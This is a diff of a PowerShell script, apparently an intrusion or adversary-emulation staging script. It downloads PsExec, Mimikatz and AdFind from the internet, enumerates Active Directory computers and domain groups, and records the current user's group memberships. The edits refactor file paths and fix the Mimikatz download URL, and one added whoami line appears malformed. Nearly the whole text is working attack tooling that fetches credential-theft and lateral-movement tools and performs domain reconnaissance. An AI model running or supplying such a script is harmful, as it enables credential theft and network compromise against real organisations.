@@ -1,19 +1,20 @@
 "Downloading PsExec"
+$staticPath= $PWD.Path
 $pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
-$outputPath = $PWD.Path+'\PSTools.zip'
-$pstoolsPath = $PWD.Path+'\PSTools'
+$outputPath = $staticPath+'\PSTools.zip'
+$pstoolsPath = $staticPath+'\PSTools'
 Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $pstoolsPath
 "Downloading Mimikatz"
 $mimikatzUrl = 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip'
-$outputPath = $PWD.Path+'\mimikatz.zip'
-$mimikatzPath = $PWD.Path+'\mimikatz'
-Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
+$outputPath = $staticPath+'\mimikatz.zip'
+$mimikatzPath = $staticPath+'\mimikatz'
+Invoke-WebRequest -Uri $mimikatzUrl -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $mimikatzPath
 "Downloading AdFind"
 $adfindUrl = "https://www.joeware.net/downloads/dl2.php"
-$outputPath = $PWD.Path+"\adfind.zip"
-$adfindPath = $PWD.Path+"\adfind"
+$outputPath = $staticPath+"\adfind.zip"
+$adfindPath = $staticPath+"\adfind"
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
@@ -34,8 +35,9 @@ Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
 
 Expand-Archive -Path $outputPath -DestinationPath $adfindPath
 cd $adfindPath
-.\adfind -f "objectcategory=computer" > ./../ adf_o.txt
-
+.\adfind -f "objectcategory=computer" > "./../computers.txt"
+cd ..
+$user = whoami
 "Checking up the domain"
-net group /domain > n_g_d_o.txt
-net users
+net group /domain > group_domains.txt
+whoami /groups user_group.txt
